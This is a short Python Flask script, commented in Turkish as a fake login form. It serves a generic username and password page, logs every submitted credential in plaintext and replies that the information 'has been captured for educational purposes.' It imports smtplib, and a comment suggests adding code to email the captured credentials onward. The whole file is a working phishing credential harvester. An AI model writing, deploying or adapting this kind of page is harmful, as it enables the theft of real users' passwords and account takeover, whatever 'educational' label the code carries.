# -*- coding: utf-8 -*-
import smtplib
from email.mime.text import MIMEText
import logging
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Logging yapılandırması
logging.basicConfig(level=logging.INFO)

# Sahte giriş formu
login_form = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST" action="/login">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(login_form)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Kullanıcı bilgilerini log dosyasına kaydetme
    logging.info(f"Username: {username}, Password: {password}")
    
    # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
    
    return "Information has been captured for educational purposes."

def main():
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    main()